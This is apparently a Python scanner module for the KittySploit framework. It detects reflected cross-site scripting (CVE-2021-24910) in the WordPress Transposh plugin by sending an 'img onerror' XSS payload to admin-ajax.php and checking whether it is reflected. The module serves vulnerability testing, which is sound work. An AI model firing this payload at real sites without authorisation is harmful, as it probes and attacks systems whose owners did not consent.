#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Transposh Translation plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Transposh Translation <1.0.8 - Cross-Site Scripting Detection',
        'description': 'WordPress Transposh Translation plugin before 1.0.8 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the a parameter via an AJAX action (available to both unauthenticated and authenticated users when the curl library is installed) before outputting it back in the response.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wordpress', 'wp-plugin', 'xss', 'wp', 'wpscan', 'transposh', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.rcesecurity.com/2022/07/WordPress-Transposh-Exploiting-a-Blind-SQL-Injection-via-XSS/',
            'https://github.com/MrTuxracer/advisories/blob/master/CVEs/CVE-2021-24910.txt',
            'https://wpscan.com/vulnerability/b5cbebf4-5749-41a0-8be3-3333853fca17',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24910',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-24910',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=tp_tp&e=g&m=s&tl=en&q=<img%20src%3dx%20onerror%3dalert(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<img src=x onerror=alert(document.domain)>', '{"result":',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Transposh Translation <1.0.8 - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=tp_tp&e=g&m=s&tl=en&q=<img%20src%3dx%20onerror%3dalert(document.domain)>',
            )
            return True
        return False

